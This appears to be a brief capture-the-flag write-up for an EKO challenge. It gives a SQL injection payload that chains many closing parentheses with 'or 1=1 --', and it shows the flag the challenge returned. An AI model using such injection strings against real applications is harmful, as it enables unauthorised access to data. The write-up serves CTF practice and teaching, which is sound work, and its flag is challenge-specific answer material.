### Solved by Kad--


The input is vulnerable to SQL injection:

```
blabla')))))))))))))))))))) or 1=1 --
```

This returns:

```
Congrats! this is your flag: EKO{sqli_with_a_lot_of_)}
```

